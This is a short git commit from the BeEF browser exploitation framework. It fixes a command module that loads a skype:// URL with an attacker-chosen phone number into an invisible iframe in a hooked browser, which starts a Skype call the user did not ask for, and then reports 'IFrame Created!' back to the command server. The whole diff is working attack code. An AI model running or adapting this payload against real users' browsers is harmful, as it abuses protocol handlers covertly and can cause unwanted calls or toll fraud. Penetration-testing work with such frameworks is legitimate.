a49f46c681130133bbc8cea4a4dfdc752cbc965e
antisnatchor <antisnatchor@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-03-14 10:31:57 +0000

    issue 269: corrected the skype handler. Now works great on Firefox and Chrome. Still don't work on Safari.
    git-svn-id: https://beef.googlecode.com/svn/trunk@792 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

--- modules/commands/host/insecure_url_skype/insecure_url_skype.js
+++ modules/commands/host/insecure_url_skype/insecure_url_skype.js
@@ -1,5 +1,5 @@
 beef.execute(function() {
 	var sploit = beef.dom.createInvisibleIframe();
-	sploit.src = 'skype:<%= @tel_num %>?cal';
+	sploit.src = 'skype://<%= @tel_num %>?call';
     beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
 });
